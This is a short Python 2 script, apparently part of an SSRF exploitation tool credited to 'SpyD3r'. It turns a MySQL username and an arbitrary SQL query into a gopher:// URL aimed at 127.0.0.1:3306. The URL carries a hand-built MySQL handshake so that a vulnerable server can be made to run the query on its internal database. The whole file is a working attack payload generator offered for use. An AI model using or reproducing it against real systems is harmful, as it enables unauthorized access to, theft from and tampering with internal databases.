
def MySQL():
    print "\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m"
    user = raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")
    encode_user = user.encode("hex")
    user_length = len(user)
    temp = user_length - 4
    length = (chr(0xa3+temp)).encode("hex")

    dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
    dump +=  encode_user
    dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
    dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"

    query = raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")

    auth = dump.replace("\n","")

    def encode(s):
        a = [s[i:i + 2] for i in range(0, len(s), 2)]
        return "gopher://127.0.0.1:3306/_%" + "%".join(a)


    def get_payload(query):
        if(query.strip()!=''):
            query = query.encode("hex")
            query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
            query_length = query_length.decode('hex')[::-1].encode('hex')
            pay1 = query_length + "0003" + query
            final = encode(auth + pay1 + "0100000001")
            return final
        else:
            return encode(auth)

    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
    print "\033[04m" + get_payload(query)+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
